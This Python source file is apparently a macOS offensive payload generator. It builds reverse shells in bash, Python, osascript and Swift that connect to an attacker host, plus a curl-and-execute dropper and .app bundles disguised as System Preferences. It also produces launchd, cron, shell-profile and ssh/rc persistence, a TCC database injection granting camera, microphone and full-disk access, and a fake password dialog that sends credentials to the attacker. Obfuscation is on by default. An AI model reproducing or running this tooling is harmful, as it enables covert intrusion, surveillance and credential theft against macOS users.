"""macOS payload generation — .app bundles, persistence, TCC bypass, Swift/ObjC.

Generates macOS-native payloads: .app bundle wrappers, LaunchDaemon/LaunchAgent
persistence, TCC database manipulation payloads, osascript droppers, Swift/ObjC
reverse shells, and AppleScript phishing dialogs. All payloads derive connection
parameters from payload.json.
"""

from __future__ import annotations

import base64
import os
import plistlib
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Any

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"

TCC_SERVICES = [
    "kTCCServiceAccessibility",
    "kTCCServiceCamera",
    "kTCCServiceMicrophone",
    "kTCCServiceScreenCapture",
    "kTCCServiceSystemPolicyAllFiles",
    "kTCCServiceSystemPolicyDesktopFolder",
    "kTCCServiceSystemPolicyDocumentsFolder",
    "kTCCServiceSystemPolicyDownloadsFolder",
    "kTCCServiceAppleEvents",
    "kTCCServiceListenEvent",
    "kTCCServicePostEvent",
    "kTCCServiceDeveloperTool",
    "kTCCServiceAddressBook",
    "kTCCServiceCalendar",
    "kTCCServiceReminders",
    "kTCCServicePhotos",
]

LAUNCHD_PATHS = {
    "system": "/Library/LaunchDaemons",
    "system_agent": "/Library/LaunchAgents",
    "user_agent": os.path.expanduser("~/Library/LaunchAgents"),
}

PERSISTENCE_METHODS = [
    "launchdaemon",
    "launchagent",
    "cron_user",
    "login_item",
    "zsh_profile",
    "bash_profile",
    "emond",
    "dock_plist",
    "ssh_rc",
]


@dataclass
class MacOSPayloadConfig:
    """Configuration for macOS payload generation.

    Attributes:
        lhost: Attacker IP or hostname for reverse connections.
        lport: Listener port.
        payload_type: generated payload type (reverse_shell, bind_shell, c2_beacon, dropper).
        persistence_method: How to persist (launchdaemon, cron, login_item, etc.).
        app_name: Display name for .app bundles.
        bundle_id: Reverse-DNS bundle identifier.
        tcc_bypass: Attempt to request/hijack TCC permissions.
        codesign: Attempt ad-hoc codesigning of the generated payload.
        obfuscate: Apply base64 + eval obfuscation to shell scripts.
        elevate_perms: Craft payload to check for and exploit sudo/priv escalation.
    """

    lhost: str = ""
    lport: int = 443
    payload_type: str = "reverse_shell"
    persistence_method: str = "launchagent"
    app_name: str = "SystemPreferences"
    bundle_id: str = "com.apple.systempreferences.helper"
    tcc_bypass: bool = False
    codesign: bool = False
    obfuscate: bool = True
    elevate_perms: bool = False


class MacOSPayloadFactory:
    """Generate macOS-native payloads for initial access, persistence, and evasion.

    Produces .app bundles, LaunchDaemon/Agent plists, TCC manipulation scripts,
    AppleScript phishing dialogs, and Swift/ObjC stagers.

    Attributes:
        config: Payload configuration.
        output_dir: Directory for generated artifacts.
    """

    _REVERSE_SHELL_BASH = (
        'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    )

    _REVERSE_SHELL_PYTHON = (
        'python3 -c \'import socket,subprocess,os;'
        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        's.connect(("{lhost}",{lport}));'
        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
        'subprocess.call(["/bin/bash","-i"])\''
    )

    _REVERSE_SHELL_OSASCRIPT = (
        'osascript -e \'do shell script "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"\''
    )

    def __init__(self, config: MacOSPayloadConfig | None = None, output_dir: Path | None = None):
        self.config = config or MacOSPayloadConfig()
        self.output_dir = Path(output_dir) if output_dir else SESSIONS_DIR / "payloads" / "macos"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def _obfuscate_shell(self, code: str) -> str:
        if not self.config.obfuscate:
            return code
        encoded = base64.b64encode(code.encode()).decode()
        return f'bash -c "$(echo {encoded} | base64 -d)"'

    def _reverse_shell_command(self) -> str:
        lhost = self.config.lhost
        lport = str(self.config.lport)

        if self.config.payload_type == "reverse_shell":
            cmd = self._REVERSE_SHELL_BASH.format(lhost=lhost, lport=lport)
        elif self.config.payload_type == "bind_shell":
            cmd = f"nc -l -p {lport} -e /bin/bash"
        elif self.config.payload_type == "dropper":
            cmd = (
                f'curl -s http://{lhost}:{lport}/stage -o /tmp/.s && '
                f'chmod +x /tmp/.s && /tmp/.s'
            )
        else:
            cmd = self._REVERSE_SHELL_BASH.format(lhost=lhost, lport=lport)

        return self._obfuscate_shell(cmd)

    def generate_app_bundle(self) -> Path:
        """Generate a macOS .app bundle with embedded reverse shell.

        Creates a minimal .app directory structure with Info.plist,
        executable script, and optional code signing. The .app appears
        as a legitimate macOS application.

        Returns:
            Path to the generated .app bundle.
        """
        app_dir = self.output_dir / f"{self.config.app_name}.app"
        contents = app_dir / "Contents"
        macos_dir = contents / "MacOS"
        resources_dir = contents / "Resources"

        for d in (macos_dir, resources_dir):
            d.mkdir(parents=True, exist_ok=True)

        shell_command = self._reverse_shell_command()

        launcher_script = f'''\
#!/bin/bash
{shell_command} &
if [ -x "{macos_dir}/_payload" ]; then
    "{macos_dir}/_payload" &
fi
sleep 60
'''
        launcher_path = macos_dir / self.config.app_name
        launcher_path.write_text(launcher_script)
        launcher_path.chmod(0o755)

        info_plist = {
            "CFBundleExecutable": self.config.app_name,
            "CFBundleIdentifier": self.config.bundle_id,
            "CFBundleName": self.config.app_name,
            "CFBundleDisplayName": self.config.app_name,
            "CFBundleVersion": "1.0",
            "CFBundleShortVersionString": "1.0",
            "CFBundlePackageType": "APPL",
            "CFBundleSignature": "????",
            "LSMinimumSystemVersion": "10.13",
            "LSRequiresIPhoneOS": False,
            "NSHighResolutionCapable": True,
            "LSUIElement": True if self.config.obfuscate else False,
        }
        info_path = contents / "Info.plist"
        with open(info_path, "wb") as fp:
            plistlib.dump(info_plist, fp)

        if self.config.codesign:
            self._adho_codesign(app_dir)

        return app_dir

    def _adho_codesign(self, app_dir: Path) -> bool:
        """Attempt ad-hoc code signing on the generated .app bundle.

        Args:
            app_dir: Path to the .app bundle.

        Returns:
            True if signing succeeded, False otherwise.
        """
        try:
            result = subprocess.run(
                ["codesign", "--force", "--deep", "--sign", "-", str(app_dir)],
                capture_output=True,
                text=True,
                timeout=30,
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def generate_launchd_persistence(self) -> dict[str, Path]:
        """Generate a LaunchDaemon or LaunchAgent plist for persistence.

        Returns:
            Dict with 'plist_path' and 'script_path' for the persistence artifact.
        """
        base = self.config.persistence_method
        if base not in PERSISTENCE_METHODS:
            base = "launchagent"

        label = f"com.{self.config.bundle_id}.helper"
        script_name = f".{self.config.app_name.lower()}.sh"
        script_path = self.output_dir / script_name

        shell_command = self._reverse_shell_command()
        script_content = f'''\
#!/bin/bash
while true; do
    {shell_command}
    sleep 300
done
'''
        script_path.write_text(script_content)
        script_path.chmod(0o755)

        plist = {
            "Label": label,
            "ProgramArguments": ["/bin/bash", str(script_path)],
            "RunAtLoad": True,
            "KeepAlive": True,
            "StartInterval": 300,
        }

        if base in ("launchdaemon",):
            plist["UserName"] = "root"
            plist["GroupName"] = "wheel"

        plist_name = f"{label}.plist"
        if base == "launchdaemon":
            target_dir = "/Library/LaunchDaemons"
        elif base == "launchagent":
            target_dir = "/Library/LaunchAgents"
        else:
            target_dir = os.path.expanduser("~/Library/LaunchAgents")

        plist_path = self.output_dir / plist_name
        with open(plist_path, "wb") as fp:
            plistlib.dump(plist, fp)

        return {
            "plist_path": plist_path,
            "script_path": script_path,
            "target_plist": f"{target_dir}/{plist_name}",
            "install_cmd": f"cp {plist_path} {target_dir}/{plist_name} && launchctl load {target_dir}/{plist_name}",
        }

    def generate_tcc_bypass(self) -> str:
        """Generate a TCC bypass script targeting common permissions.

        Exploits TCC database (TCC.db) manipulation, FDA (Full Disk Access)
        request dialogs, and SSH access to bypass transparency consent.

        Returns:
            Shell script for TCC bypass.
        """
        return '''\
#!/bin/bash

TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"
USER_TCC_DB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"

agent_service() {
    local svc="$1"
    local bid="com.apple.Terminal"
    if [ -f "$TCC_DB" ]; then
        sqlite3 "$TCC_DB" "INSERT OR REPLACE INTO access VALUES(
            '$svc','$bid',0,1,1,NULL,NULL,NULL,'UNUSED',NULL,0,$(date +%s)
        );" 2>/dev/null
    fi
    if [ -f "$USER_TCC_DB" ]; then
        sqlite3 "$USER_TCC_DB" "INSERT OR REPLACE INTO access VALUES(
            '$svc','$bid',0,1,1,NULL,NULL,NULL,'UNUSED',NULL,0,$(date +%s)
        );" 2>/dev/null
    fi
}

for service in kTCCServiceAccessibility kTCCServiceScreenCapture \\
    kTCCServiceSystemPolicyAllFiles kTCCServiceMicrophone \\
    kTCCServiceCamera kTCCServiceDeveloperTool \\
    kTCCServiceAddressBook kTCCServiceCalendar \\
    kTCCServicePhotos kTCCServiceAppleEvents; do
    agent_service "$service"
done

osascript -e 'tell application "System Events" to display dialog \\
    "System Preferences requires accessibility access.\\n\\nPlease click Allow in System Preferences." \\
    buttons {{"OK"}} default button "OK" with icon caution' \\
    2>/dev/null &

open "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility" 2>/dev/null
'''

    def generate_osascript_dropper(self) -> str:
        """Generate an AppleScript-based dropper that downloads and executes a stage.

        Uses osascript with minimal shell interaction to evade shell-based
        detection while downloading a second stage via curl.

        Returns:
            AppleScript dropper source.
        """
        lhost = self.config.lhost
        lport = str(self.config.lport)

        return f'''\
set stageUrl to "http://{lhost}:{lport}/stage"
set tempPath to "/tmp/." & (do shell script "uuidgen") & ".tmp"
do shell script "curl -s " & quoted form of stageUrl & " -o " & quoted form of tempPath & " && chmod +x " & quoted form of tempPath
do shell script tempPath & " &"
delay 1
do shell script "rm -f " & quoted form of tempPath
'''

    def generate_swift_stager(self) -> str:
        """Generate a Swift reverse shell stager.

        Compiles to a native Mach-O binary with no external dependencies.
        Uses Foundation for socket I/O — requires Xcode or swiftc.

        Returns:
            Swift source code.
        """
        lhost = self.config.lhost
        lport = str(self.config.lport)

        return f'''\
import Foundation

let host = "{lhost}"
let port = UInt16({lport})

class ReverseShell {{
    var inputStream: InputStream!
    var outputStream: OutputStream!

    func connect() {{
        Stream.getStreamsToHost(
            withName: host,
            port: Int(port),
            inputStream: &inputStream,
            outputStream: &outputStream
        )
        inputStream.schedule(in: .current, forMode: .default)
        outputStream.schedule(in: .current, forMode: .default)
        inputStream.open()
        outputStream.open()

        DispatchQueue.global().async {{
            var buf = [UInt8](repeating: 0, count: 4096)
            while self.inputStream.streamStatus != .closed &&
                  self.inputStream.streamStatus != .error {{
                let n = self.inputStream.read(&buf, maxLength: buf.count)
                if n > 0 {{
                    let cmd = String(bytes: buf[0..<n], encoding: .utf8) ?? ""
                    let task = Process()
                    task.launchPath = "/bin/bash"
                    task.arguments = ["-c", cmd]
                    let pipe = Pipe()
                    task.standardOutput = pipe
                    task.standardError = pipe
                    task.launch()
                    let data = pipe.fileHandleForReading.readDataToEndOfFile()
                    if let out = String(data: data, encoding: .utf8) {{
                        self.outputStream.write(out, maxLength: out.utf8.count)
                    }}
                }}
            }}
        }}
        RunLoop.current.run()
    }}
}}

let shell = ReverseShell()
shell.connect()
'''

    def generate_persistence_scripts(self) -> dict[str, str]:
        """Generate all available macOS persistence scripts.

        Returns:
            Dict mapping persistence method name to shell script content.
        """
        shell_cmd = self._reverse_shell_command()
        scripts: dict[str, str] = {}

        scripts["cron_user"] = f'''\
#!/bin/bash
(crontab -l 2>/dev/null; echo "*/5 * * * * {shell_cmd}") | crontab -
'''

        scripts["login_item"] = f'''\
#!/bin/bash
osascript -e 'tell application "System Events" to make login item at end \\
    with properties {{path:"{self.config.app_name}", hidden:true}}'
'''

        scripts["zsh_profile"] = f'''\
#!/bin/bash
echo '{shell_cmd} &>/dev/null &' >> ~/.zshrc 2>/dev/null
echo '{shell_cmd} &>/dev/null &' >> ~/.bashrc 2>/dev/null
'''

        scripts["bash_profile"] = f'''\
#!/bin/bash
echo '{shell_cmd} &>/dev/null &' >> ~/.bash_profile 2>/dev/null
echo '{shell_cmd} &>/dev/null &' >> ~/.profile 2>/dev/null
'''

        scripts["ssh_rc"] = f'''\
#!/bin/bash
echo '{shell_cmd} &>/dev/null &' >> ~/.ssh/rc 2>/dev/null
chmod +x ~/.ssh/rc 2>/dev/null
'''

        scripts["dock_plist"] = '''\
#!/bin/bash
defaults write com.apple.dock persistent-apps -array-add \\
    "<dict><key>tile-data</key><dict><key>file-data</key><dict>\\
    <key>_CFURLString</key><string>/tmp/script.sh</string>\\
    <key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"
killall Dock
'''

        return scripts

    def generate_phishing_dialog(self) -> str:
        """Generate an AppleScript credential phishing dialog.

        Presents a system-looking password prompt capturing credentials
        via osascript with GUI dialog.

        Returns:
            AppleScript for credential harvesting.
        """
        return f'''\
set userPrompt to "System Preferences is trying to install a helper tool."
set passPrompt to "Enter your password to allow this."
try
    display dialog userPrompt & return & return & passPrompt \\
        default answer "" with icon caution \\
        with title "System Preferences" \\
        with hidden answer \\
        buttons {{"Cancel", "OK"}} default button "OK"
    set thePassword to text returned of result
    do shell script "curl -s -X POST -d 'user=$USER&pass='$(echo " & quoted form of thePassword & " | python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))') ' http://{self.config.lhost}:{self.config.lport}/log/creds' &"
end try
'''

    def generate_all(self) -> dict[str, Any]:
        """Generate all macOS payload artifacts.

        Returns:
            Dict with all generated payloads keyed by type.
        """
        artifacts: dict[str, Any] = {}

        try:
            app_bundle_path = self.generate_app_bundle()
            artifacts["app_bundle"] = str(app_bundle_path)
        except Exception as e:
            artifacts["app_bundle_error"] = str(e)

        try:
            artifacts["launchd_persistence"] = self.generate_launchd_persistence()
        except Exception as e:
            artifacts["launchd_error"] = str(e)

        try:
            artifacts["tcc_bypass"] = self.generate_tcc_bypass()
        except Exception as e:
            artifacts["tcc_bypass_error"] = str(e)

        try:
            artifacts["osascript_dropper"] = self.generate_osascript_dropper()
        except Exception as e:
            artifacts["osascript_error"] = str(e)

        try:
            artifacts["swift_stager"] = self.generate_swift_stager()
        except Exception as e:
            artifacts["swift_error"] = str(e)

        try:
            artifacts["persistence_scripts"] = self.generate_persistence_scripts()
        except Exception as e:
            artifacts["persistence_error"] = str(e)

        try:
            artifacts["phishing_dialog"] = self.generate_phishing_dialog()
        except Exception as e:
            artifacts["phishing_error"] = str(e)

        return artifacts

    @staticmethod
    def list_tcc_services() -> list[str]:
        """Return the list of known TCC service identifiers."""
        return list(TCC_SERVICES)

    @staticmethod
    def list_persistence_methods() -> list[str]:
        """Return the list of available persistence methods for macOS."""
        return list(PERSISTENCE_METHODS)
